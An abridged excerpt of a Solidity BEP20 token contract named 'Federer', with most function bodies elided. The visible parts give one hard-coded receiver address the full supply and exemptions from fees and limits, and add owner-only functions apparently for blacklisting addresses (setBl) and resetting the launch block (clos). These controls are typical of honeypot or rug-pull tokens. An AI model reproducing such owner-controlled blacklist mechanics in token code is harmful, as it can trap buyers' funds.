...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address receiverAddress) 
    {
        ...
        isExcludedFromCut[receiverAddress] = true;
        ...
        isMaxEatExempt[receiverAddress] = true;
        
        isOnceEatExempt[owner()] = true;
        isOnceEatExempt[address(this)] = true;
        isOnceEatExempt[receiverAddress] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[receiverAddress] = _totalSupply;
        emit Transfer(address(0),receiverAddress, _totalSupply);
    }
    ...
    function setBl(address recipient, bool status) public onlyOwner {
    ...
    function clos() public onlyOwner {
        launchBlock = 0;
    }
...
contract Federer is BEP20 {
    constructor() BEP20(
        ...
        0x26Ba9410Ee95C44CCE6143857bD1Bc36287B9CAC
    ){}
}